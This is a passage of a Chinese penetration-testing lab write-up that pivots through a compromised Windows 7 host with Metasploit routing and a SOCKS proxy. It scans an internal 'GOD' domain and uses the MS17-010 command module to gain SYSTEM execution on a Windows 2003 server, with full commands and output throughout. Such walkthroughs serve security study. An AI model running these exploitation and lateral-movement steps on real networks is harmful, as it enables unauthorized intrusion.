<span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span>
<span class="line"></span>
<span class="line">Active Routing Table</span>
<span class="line">====================</span>
<span class="line"></span>
<span class="line">   Subnet             Netmask            Gateway</span>
<span class="line">   ------             -------            -------</span>
<span class="line">   169.254.0.0        255.255.0.0        Session 1</span>
<span class="line">   192.168.52.0       255.255.255.0      Session 1</span>
<span class="line">   192.168.220.0      255.255.255.0      Session 1</span>
<span class="line">   </span>
<span class="line">meterpreter &gt; background </span>
<span class="line">[*] Backgrounding session 1...</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后配置代理</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/server/socks_proxy</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options </span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>auxiliary/server/socks_proxy<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   PASSWORD                   no        Proxy password <span class="token keyword">for</span> SOCKS5 listener</span>
<span class="line">   SRVHOST   <span class="token number">0.0</span>.0.0          <span class="token function">yes</span>       The address to listen on</span>
<span class="line">   SRVPORT   <span class="token number">1080</span>             <span class="token function">yes</span>       The port to listen on</span>
<span class="line">   USERNAME                   no        Proxy username <span class="token keyword">for</span> SOCKS5 listener</span>
<span class="line">   VERSION   <span class="token number">5</span>                <span class="token function">yes</span>       The SOCKS version to use <span class="token punctuation">(</span>Accepted: 4a, <span class="token number">5</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Auxiliary action:</span>
<span class="line"></span>
<span class="line">   Name   Description</span>
<span class="line">   ----   -----------</span>
<span class="line">   Proxy  Run a SOCKS proxy server</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> srvhost <span class="token number">127.0</span>.0.1</span>
<span class="line">srvhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">127.0</span>.0.1</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module running as background job <span class="token number">0</span>.</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting the SOCKS proxy server</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用msf模块扫描存活主机</p><blockquote><p>可见三台</p></blockquote><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/scanner/netbios/nbname</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>scanner/netbios/nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.52.0/24</span>
<span class="line">rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.52.0/24</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>scanner/netbios/nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options </span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>auxiliary/scanner/netbios/nbname<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name       Current Setting  Required  Description</span>
<span class="line">   ----       ---------------  --------  -----------</span>
<span class="line">   BATCHSIZE  <span class="token number">256</span>              <span class="token function">yes</span>       The number of hosts to probe <span class="token keyword">in</span> each <span class="token builtin class-name">set</span></span>
<span class="line">   RHOSTS     <span class="token number">192.168</span>.52.0/24  <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo</span>
<span class="line">                                         it</span>
<span class="line">   RPORT      <span class="token number">137</span>              <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>UDP<span class="token punctuation">)</span></span>
<span class="line">   THREADS    <span class="token number">10</span>               <span class="token function">yes</span>       The number of concurrent threads</span>
<span class="line"></span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>scanner/netbios/nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending NetBIOS requests to <span class="token number">192.168</span>.52.0-<span class="token operator">&gt;</span><span class="token number">192.168</span>.52.255 <span class="token punctuation">(</span><span class="token number">256</span> hosts<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.138 <span class="token punctuation">[</span>OWA<span class="token punctuation">]</span> OS:Windows Names:<span class="token punctuation">(</span>OWA, GOD<span class="token punctuation">)</span> Addresses:<span class="token punctuation">(</span><span class="token number">192.168</span>.52.138<span class="token punctuation">)</span> Mac:00:0c:29:c1:33:d6 Virtual Machine:VMWare</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141 <span class="token punctuation">[</span>ROOT-TVI862UBEH<span class="token punctuation">]</span> OS:Windows Names:<span class="token punctuation">(</span>ROOT-TVI862UBEH, GOD, SNTL_ROOT-TVI86<span class="token punctuation">)</span> Addresses:<span class="token punctuation">(</span><span class="token number">192.168</span>.52.141<span class="token punctuation">)</span> Mac:00:0c:29:1c:44:8e Virtual Machine:VMWare</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.143 <span class="token punctuation">[</span>STU1<span class="token punctuation">]</span> OS:Windows Names:<span class="token punctuation">(</span>STU1, GOD, __MSBROWSE__<span class="token punctuation">)</span>  Mac:00:0c:29:bd:35:01 Virtual Machine:VMWare</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="法二-cs-1" tabindex="-1"><a class="header-anchor" href="#法二-cs-1"><span>法二：CS</span></a></h3><blockquote><p>PS. 下面internal拿到192.254是不正常的</p></blockquote><p><img src="`+is+'" alt="image-20220815013954624"></p><p>经检查，发现是网卡识别错误，需要将其他无用网卡禁用后才能拿到正确的internal IP</p><p><img src="'+ls+'" alt="image-20220815151257133"></p><p>怎么探测都没反应，命令不执行</p><p><img src="'+ts+'" alt="image-20220815151634275"></p><p>发现是CS的bug，自己敲一遍就行了</p><p><img src="'+cs+'" alt="image-20220815151840765"></p><p>回到列表视图，扫端口</p><p><img src="'+os+'" alt="image-20220815152357885"></p><p><s>又出Bug了，CS识别不到目标机所在的内网ip段</s></p><p>点开之后要等一段时间才能扫到</p><p><img src="'+us+'" alt="image-20220815155618348"></p><p><img src="'+rs+`" alt="image-20220815155810801"></p><h2 id="横向移动" tabindex="-1"><a class="header-anchor" href="#横向移动"><span>横向移动</span></a></h2><p>扫一下跟目前被攻击的机器(Win7)的内网里的另一台机器(Win2k3)开了哪些端口</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> proxychains4 nmap <span class="token parameter variable">-p</span> <span class="token number">1</span>-1000 <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sT</span> <span class="token number">192.168</span>.52.141</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> exec: proxychains4 nmap <span class="token parameter variable">-p</span> <span class="token number">1</span>-1000 <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sT</span> <span class="token number">192.168</span>.52.141</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains4.conf</span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.16</span></span>
<span class="line">Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2022</span>-08-15 04:18 EDT</span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:111 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:143 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:135  <span class="token punctuation">..</span>.  OK</span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:139  <span class="token punctuation">..</span>.  OK</span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:53 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:256 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:445  <span class="token punctuation">..</span>.  OK</span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:199 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:21  <span class="token punctuation">..</span>.  OK</span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:995 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:25 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:993 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:22 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发现445端口SMB，看下版本</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/scanner/smb/smb_version</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options </span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>auxiliary/scanner/smb/smb_version<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name     Current Setting  Required  Description</span>
<span class="line">   ----     ---------------  --------  -----------</span>
<span class="line">   RHOSTS                    <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span>
<span class="line">   THREADS  <span class="token number">1</span>                <span class="token function">yes</span>       The number of concurrent threads <span class="token punctuation">(</span>max one per <span class="token function">host</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.52.141</span>
<span class="line">rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.52.141</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - SMB Detected <span class="token punctuation">(</span>versions:1<span class="token punctuation">)</span> <span class="token punctuation">(</span>preferred dialect:<span class="token punctuation">)</span> <span class="token punctuation">(</span>signatures:optional<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    -   Host is running Windows <span class="token number">2003</span> <span class="token punctuation">(</span>build:3790<span class="token punctuation">)</span> <span class="token punctuation">(</span>name:ROOT-TVI862UBEH<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:GOD<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:       - Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>永恒之蓝打他，跑个ipconfig。</p><blockquote><p>use auxiliary/admin/smb/ms17_010_command</p><p>set rhosts 192.168.52.141</p><p>set command 命令</p><p>run</p></blockquote><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> search ms17-010</span>
<span class="line"></span>
<span class="line">Matching Modules</span>
<span class="line"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span></span>
<span class="line"></span>
<span class="line">   <span class="token comment">#  Name                                      Disclosure Date  Rank     Check  Description</span></span>
<span class="line">   -  ----                                      ---------------  ----     -----  -----------</span>
<span class="line">   <span class="token number">0</span>  exploit/windows/smb/ms17_010_eternalblue  <span class="token number">2017</span>-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span>
<span class="line">   <span class="token number">1</span>  exploit/windows/smb/ms17_010_psexec       <span class="token number">2017</span>-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span>
<span class="line">   <span class="token number">2</span>  auxiliary/admin/smb/ms17_010_command      <span class="token number">2017</span>-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span>
<span class="line">   <span class="token number">3</span>  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span>
<span class="line">   <span class="token number">4</span>  exploit/windows/smb/smb_doublepulsar_rce  <span class="token number">2017</span>-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Interact with a module by name or index. For example info <span class="token number">4</span>, use <span class="token number">4</span> or use exploit/windows/smb/smb_doublepulsar_rce</span>
<span class="line"></span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use <span class="token number">2</span></span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options </span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>auxiliary/admin/smb/ms17_010_command<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name                  Current Setting                     Required  Description</span>
<span class="line">   ----                  ---------------                     --------  -----------</span>
<span class="line">   COMMAND               net group <span class="token string">&quot;Domain Admins&quot;</span> /domain   <span class="token function">yes</span>       The <span class="token builtin class-name">command</span> you want to execute on the remote <span class="token function">host</span></span>
<span class="line">   DBGTRACE              <span class="token boolean">false</span>                               <span class="token function">yes</span>       Show extra debug trace info</span>
<span class="line">   LEAKATTEMPTS          <span class="token number">99</span>                                  <span class="token function">yes</span>       How many <span class="token builtin class-name">times</span> to try to leak transaction</span>
<span class="line">   NAMEDPIPE                                                 no        A named pipe that can be connected to <span class="token punctuation">(</span>leave blank <span class="token keyword">for</span> auto<span class="token punctuation">)</span></span>
<span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/da  <span class="token function">yes</span>       List of named pipes to check</span>
<span class="line">                         ta/wordlists/named_pipes.txt</span>
<span class="line">   RHOSTS                                                    <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit</span>
<span class="line">                                                                       -framework/wiki/Using-Metasploit</span>
<span class="line">   RPORT                 <span class="token number">445</span>                                 <span class="token function">yes</span>       The Target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span></span>
<span class="line">   SERVICE_DESCRIPTION                                       no        Service description to to be used on target <span class="token keyword">for</span> pretty listi</span>
<span class="line">                                                                       ng</span>
<span class="line">   SERVICE_DISPLAY_NAME                                      no        The <span class="token function">service</span> display name</span>
<span class="line">   SERVICE_NAME                                              no        The <span class="token function">service</span> name</span>
<span class="line">   SMBDomain             <span class="token builtin class-name">.</span>                                   no        The Windows domain to use <span class="token keyword">for</span> authentication</span>
<span class="line">   SMBPass                                                   no        The password <span class="token keyword">for</span> the specified username</span>
<span class="line">   SMBSHARE              C$                                  <span class="token function">yes</span>       The name of a writeable share on the server</span>
<span class="line">   SMBUser                                                   no        The username to authenticate as</span>
<span class="line">   THREADS               <span class="token number">1</span>                                   <span class="token function">yes</span>       The number of concurrent threads <span class="token punctuation">(</span>max one per <span class="token function">host</span><span class="token punctuation">)</span></span>
<span class="line">   WINPATH               WINDOWS                             <span class="token function">yes</span>       The name of the remote Windows directory</span>
<span class="line"></span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.52.141</span>
<span class="line">rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.52.141</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> <span class="token builtin class-name">command</span> ipconfig</span>
<span class="line"><span class="token builtin class-name">command</span> <span class="token operator">=</span><span class="token operator">&gt;</span> ipconfig</span>
<span class="line">msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Target OS: Windows Server <span class="token number">2003</span> <span class="token number">3790</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Filling barrel with fish<span class="token punctuation">..</span>. <span class="token keyword">done</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - <span class="token operator">&lt;</span>---------------- <span class="token operator">|</span> Entering Danger Zone <span class="token operator">|</span> ----------------<span class="token operator">&gt;</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    -     <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Preparing dynamite<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    -             Trying stick <span class="token number">1</span> <span class="token punctuation">(</span>x64<span class="token punctuation">)</span><span class="token punctuation">..</span>.Miss</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    -             <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying stick <span class="token number">2</span> <span class="token punctuation">(</span>x86<span class="token punctuation">)</span><span class="token punctuation">..</span>.Boom<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    -     <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully Leaked Transaction<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    -     <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully caught Fish-in-a-barrel</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - <span class="token operator">&lt;</span>---------------- <span class="token operator">|</span> Leaving Danger Zone <span class="token operator">|</span> ----------------<span class="token operator">&gt;</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Reading from CONNECTION struct at: 0x87a26cc8</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Built a write-what-where primitive<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Overwrite complete<span class="token punctuation">..</span>. SYSTEM session obtained<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Service start timed out, OK <span class="token keyword">if</span> running a <span class="token builtin class-name">command</span> or non-service executable<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Getting the <span class="token builtin class-name">command</span> output<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Executing cleanup<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Cleanup was successful</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Command completed successfully<span class="token operator">!</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Output <span class="token keyword">for</span> <span class="token string">&quot;ipconfig&quot;</span><span class="token builtin class-name">:</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Windows IP Configuration</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Ethernet adapter Local Area Connection:</span>
<span class="line"></span>
<span class="line">   Connection-specific DNS Suffix  <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> </span>
<span class="line">   IP Address. <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> <span class="token number">192.168</span>.52.141</span>
<span class="line">   Subnet Mask <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> <span class="token number">255.255</span>.255.0</span>
<span class="line">   Default Gateway <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> <span class="token number">192.168</span>.52.2</span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed</span>
